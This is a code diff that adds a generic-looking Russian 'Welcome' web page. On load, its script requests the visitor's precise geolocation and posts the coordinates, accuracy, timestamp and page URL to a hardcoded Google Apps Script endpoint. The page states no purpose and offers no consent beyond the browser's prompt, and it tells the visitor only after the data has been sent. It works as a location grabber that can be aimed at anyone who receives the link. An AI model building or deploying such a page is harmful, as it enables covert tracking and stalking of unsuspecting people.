@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Страница</title>
+</head>
+<body>
+    <h1>Добро пожаловать</h1>
+    <p id="status">Определение местоположения...</p>
+
+    <script>
+        (function() {
+            'use strict';
+
+            const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwgw4EkLeeUfn6DLj8v9Ph1ByiVWn-xkFNw03wCiJ5dHOPbthyYUsm_pAzIoK8ds0ly/exec';
+
+            function sendToSheet(payload) {
+                fetch(APPS_SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: JSON.stringify(payload)
+                }).catch(function(err) {
+                    console.warn('Ошибка отправки:', err);
+                });
+            }
+
+            function onSuccess(position) {
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    page: location.href
+                };
+                sendToSheet(data);
+                document.getElementById('status').textContent = 'Координаты получены и отправлены.';
+            }
+
+            function onError(err) {
+                document.getElementById('status').textContent = 'Геолокация недоступна: ' + err.message;
+            }
+
+            if (!navigator.geolocation) {
+                document.getElementById('status').textContent = 'Браузер не поддерживает Geolocation API.';
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(onSuccess, onError, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        })();
+    </script>
+</body>
+</html>
